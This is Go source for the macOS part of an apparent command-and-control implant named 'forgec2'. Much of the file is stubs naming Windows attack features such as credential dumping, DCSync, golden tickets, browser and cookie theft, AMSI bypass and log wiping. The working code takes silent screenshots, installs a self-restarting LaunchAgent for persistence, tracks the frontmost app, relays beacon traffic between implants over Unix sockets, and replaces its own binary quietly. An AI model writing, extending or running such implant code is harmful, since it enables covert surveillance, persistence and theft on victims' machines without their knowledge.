//go:build darwin
// +build darwin

package main

import (
	"encoding/binary"
	"fmt"
	"image"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// macOS platform implementations. Screenshot via screencapture; advanced Win32 features are stubbed.

func setDPIAware() {
	// noop on macOS
}

func captureScreenRGBA() (*image.RGBA, error) {
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("forgec2_screen_%d.png", time.Now().UnixNano()))
	defer os.Remove(tmpFile)

	cmd := exec.Command("screencapture", "-x", tmpFile)
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("screenshot not available (screencapture failed: %w — grant Screen Recording permission in System Settings)", err)
	}

	f, err := os.Open(tmpFile)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	img, err := png.Decode(f)
	if err != nil {
		return nil, fmt.Errorf("decode screencapture png: %w", err)
	}
	bounds := img.Bounds()
	rgba := image.NewRGBA(bounds)
	for y := bounds.Min.Y; y < bounds.Max.Y; y++ {
		for x := bounds.Min.X; x < bounds.Max.X; x++ {
			rgba.Set(x, y, img.At(x, y))
		}
	}
	return rgba, nil
}

func applyHideWindow(cmd *exec.Cmd) {}

func addPersistenceWindows() {}
func addPersistenceLinux() {}

// addPersistenceDarwin installs a LaunchAgent plist in ~/Library/LaunchAgents.
func addPersistenceDarwin() {
	exe, err := os.Executable()
	if err != nil {
		if Debug {
			fmt.Printf("[!] persistence: cannot resolve executable: %v\n", err)
		}
		return
	}
	absExe, err := filepath.Abs(exe)
	if err != nil {
		absExe = exe
	}

	home := os.Getenv("HOME")
	if home == "" {
		if Debug {
			fmt.Println("[!] persistence: HOME not set")
		}
		return
	}

	launchAgentsDir := filepath.Join(home, "Library", "LaunchAgents")
	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
		if Debug {
			fmt.Printf("[!] persistence: mkdir LaunchAgents failed: %v\n", err)
		}
		return
	}

	label := "com.forgec2.agent"
	plistPath := filepath.Join(launchAgentsDir, label+".plist")
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>%s</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>`, label, absExe)

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		if Debug {
			fmt.Printf("[!] persistence: write plist failed: %v\n", err)
		}
		return
	}

	guiDomain := fmt.Sprintf("gui/%d", os.Getuid())
	_ = exec.Command("launchctl", "bootout", guiDomain, plistPath).Run()
	if out, err := exec.Command("launchctl", "bootstrap", guiDomain, plistPath).CombinedOutput(); err != nil {
		if Debug {
			fmt.Printf("[!] persistence: launchctl bootstrap: %v %s\n", err, string(out))
		}
	} else if Debug {
		fmt.Printf("[*] persistence: LaunchAgent installed at %s\n", plistPath)
	}
}

// getActiveWindowTitle returns the frontmost application/window via osascript.
func getActiveWindowTitle() string {
	script := `tell application "System Events" to get name of first application process whose frontmost is true`
	out, err := exec.Command("osascript", "-e", script).Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func getPlatformSecurityInfo() (string, bool, string) {
	elevated := os.Geteuid() == 0
	integrity := "Medium"
	if elevated {
		integrity = "High"
	}
	domain, _ := os.Hostname()
	return integrity, elevated, domain
}

func keyloggerLoop() {
	if Debug {
		fmt.Println("[*] Keylogger not supported on macOS agent yet")
	}
	keylogActive = false
}

func suspendProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("suspend only supported on Windows Go agent")
}

func resumeProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("resume only supported on Windows Go agent")
}

func killProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("killproc only supported on Windows Go agent")
}

func clipboardGetWindows() (string, error) {
	return "", fmt.Errorf("clipboard only on Windows")
}

func clipboardSetWindows(data string) error {
	return fmt.Errorf("clipboard only on Windows")
}

func regGetWindows(key string) (string, error) {
	return "", fmt.Errorf("registry only on Windows")
}

func regSetWindows(path, data string) error {
	return fmt.Errorf("registry only on Windows")
}

func regDeleteWindows(key string) error {
	return fmt.Errorf("registry only on Windows")
}

func dumpCreds() (string, error) {
	return "", fmt.Errorf("creds dumping only supported on Windows Go agent (EXE)")
}

func injectProcess(pid uint32, shellcode []byte, tech string) error {
	return fmt.Errorf("process injection only supported on Windows Go agent")
}

func lateralMove(spec string) (string, error) {
	return "", fmt.Errorf("lateral movement only supported on Windows Go agent")
}

func spawnProcess(targetExe string, shellcode []byte, technique string) string {
	return "not supported on macOS"
}

func startSocksServer(addr string) {
	go func() {
		ln, err := net.Listen("tcp", addr)
		if err != nil {
			return
		}
		for {
			c, err := ln.Accept()
			if err != nil {
				continue
			}
			c.Close()
		}
	}()
}

type tokenInfoResult struct {
	PID         uint32
	ProcessName string
	Domain      string
	Username    string
	Integrity   string
	TokenType   string
	Error       string
}

func executeBOF(bofData []byte, args string) (string, error) {
	return "", fmt.Errorf("BOF is Windows-only")
}

func tokenListProcesses() ([]tokenInfoResult, error) {
	return nil, fmt.Errorf("token ops are Windows-only")
}
func tokenSteal(pid uint32) (string, string, string, error) {
	return "", "", "", fmt.Errorf("token ops are Windows-only")
}
func getCurrentTokenUser() string { return "" }
func tokenMake(domainUser, password, logonTypeStr string) (string, string, string, error) {
	return "", "", "", fmt.Errorf("token ops are Windows-only")
}
func tokenRevert() error {
	return fmt.Errorf("token ops are Windows-only")
}

func sendP2PSMBBeacon(body []byte) []byte {
	pipeName := strings.TrimPrefix(P2PParent, "pipe://")
	pipePath := fmt.Sprintf("/tmp/%s", pipeName)
	conn, err := net.Dial("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB pipe dial to %s failed: %v\n", pipePath, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

func p2pListenSMB() {
	pipePath := fmt.Sprintf("/tmp/%s", P2PListenAddr)
	os.Remove(pipePath)
	ln, err := net.Listen("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB listen on %s failed: %v\n", pipePath, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}

func peloaderReflective(b64Data string) (string, error) {
	return "", fmt.Errorf("reflective DLL loader is Windows-only")
}

func executeAssemblyForkRun(b64Data string) (string, error) {
	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
}

func rportfwdCollectOutbound() []socksFrame { return nil }
func rportfwdHandleFrames(frames []socksFrame) {}
func rportfwdDial(connID uint64, target string) {}
func rportfwdWrite(connID uint64, data []byte) {}
func rportfwdClose(connID uint64) {}

func kerberosDCSync(user string) (string, error) {
	return "", fmt.Errorf("DCSync is Windows-only")
}
func kerberosGoldenTicket(user, domain, sid, krbtgtHash string) (string, error) {
	return "", fmt.Errorf("golden ticket is Windows-only")
}
func kerberosSilverTicket(user, domain, sid, target, rc4Hash string) (string, error) {
	return "", fmt.Errorf("silver ticket is Windows-only")
}
func kerberosASREPRoast() (string, error) {
	return "", fmt.Errorf("ASREP roast is Windows-only")
}
func kerberosPassTheHash(user, domain, ntlmHash, target string) (string, error) {
	return "", fmt.Errorf("pass-the-hash is Windows-only")
}
func kerberosPassTheTicket(ticketB64 string) (string, error) {
	return "", fmt.Errorf("pass-the-ticket is Windows-only")
}

func powerPick(script string) string { return "not supported on macOS" }

func stealBrowserData(browser string) string {
	return "browser data theft is Windows-only"
}

func exportCookies(browser string) string {
	return "cookie export is Windows-only"
}

func exportVpnCreds() string {
	return "vpn credential export is Windows-only"
}

func remoteInputStub(payload string) string {
	if Debug {
		fmt.Printf("[*] remote_input stub (macOS): %s\n", payload)
	}
	return "remote_input: stub (log only — SendInput not implemented on macOS)"
}

func applyPersistence(method string, args string) string {
	return "not supported on macOS"
}

func listPersistence() string   { return "not supported on macOS" }
func removePersistence(method string, args string) string {
	return "not supported on macOS"
}

func uacBypass(method, payload string) string { return "not supported on macOS" }

func executeNetCommand(cmd string) string { return "net command suite is Windows-only" }

func amsiBypass() string         { return "not supported on macOS" }
func amsiSessionBypass() string  { return "not supported on macOS" }
func etwBypass() string          { return "not supported on macOS" }
func etwNtTraceEvent() string    { return "not supported on macOS" }
func blockDLLs() string          { return "not supported on macOS" }
func unhookNtdll() string        { return "not supported on macOS" }
func protectProcess() string     { return "not supported on macOS" }
func selfDelete() string         { return "not supported on macOS" }
func wipeEventLog() string       { return "not supported on macOS" }
func wipeTracks() string         { return "not supported on macOS" }

func selfUpdateWindows(exe, tmpPath string) string { return "" }

func selfUpdateLinux(exe, tmpPath string) string { return "" }

func selfUpdateDarwin(exe, tmpPath string) string {
	shScript := fmt.Sprintf(
		"#!/bin/sh\nsleep 1\ncp -f '%s' '%s'\nchmod +x '%s'\nexec '%s'\n",
		tmpPath, exe, exe, exe)
	tmpScript := exe + ".update.sh"
	if err := os.WriteFile(tmpScript, []byte(shScript), 0755); err != nil {
		return "failed to write update script: " + err.Error()
	}
	cmd := exec.Command("/bin/sh", "-c", "nohup '"+tmpScript+"' >/dev/null 2>&1 &")
	if err := cmd.Start(); err != nil {
		return "failed to start updater: " + err.Error()
	}
	return "self-update: new binary downloaded, replacing and restarting..."
}

func lateralWMI(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralWinRM(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralPsexec(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralDCOM(target, user, pass, cmd string) (string, error) {
	return "", fmt.Errorf("lateral movement is Windows-only")
}
func lateralSCF(targetShare string) (string, error) {
	return "", fmt.Errorf("SCF hash capture is Windows-only")
}
func netScanSMB(cidr string) (string, error) {
	return "", fmt.Errorf("SMB scanning is Windows-only")
}
func netEnumHosts(domain string) (string, error) {
	return "", fmt.Errorf("host enumeration is Windows-only")
}
func netScanSMBDiscovery() (string, error) {
	return "", fmt.Errorf("SMB discovery is Windows-only")
}

func dpapiMasterKey() (string, error)       { return "", fmt.Errorf("DPAPI is Windows-only") }
func dpapiBlob(filePath string) (string, error) { return "", fmt.Errorf("DPAPI is Windows-only") }
func dpapiBrowser() (string, error)         { return "", fmt.Errorf("DPAPI browser decryption is Windows-only") }
func lsaBypass() (string, error)            { return "", fmt.Errorf("LSA bypass is Windows-only") }
func adcsFind() (string, error)             { return "", fmt.Errorf("AD CS enumeration is Windows-only") }
func adcsRequest(template string) (string, error) {
	return "", fmt.Errorf("AD CS certificate request is Windows-only")
}
func shadowCreds(target string) (string, error) {
	return "", fmt.Errorf("Shadow Credentials is Windows-only")
}
func ldapQuery(filter string) (string, error)     { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapUsers() (string, error)                  { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapGroups() (string, error)                 { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapComputers() (string, error)              { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapSPN() (string, error)                  { return "", fmt.Errorf("LDAP queries are Windows-only") }
func ldapACL() (string, error)                    { return "", fmt.Errorf("LDAP queries are Windows-only") }